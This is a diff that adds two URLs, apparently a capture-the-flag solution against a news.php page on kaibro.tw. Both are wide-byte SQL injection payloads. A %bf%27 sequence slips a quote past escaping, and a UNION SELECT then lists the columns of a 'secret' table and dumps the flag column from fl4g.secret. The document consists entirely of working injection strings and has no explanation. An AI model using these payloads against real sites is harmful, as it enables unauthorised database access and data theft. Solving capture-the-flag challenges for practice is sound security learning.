@@ -1,0 +1,3 @@
+http://kaibro.tw:10003/news.php?hint&lang=zh-CN%bf%27%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=0x736563726574--+
+
+http://kaibro.tw:10003/news.php?hint&lang=zh-CN%bf%27%20union%20select%201,2,hex(THIS_IS_FLAG_YO),4%20from%20fl4g.secret--+
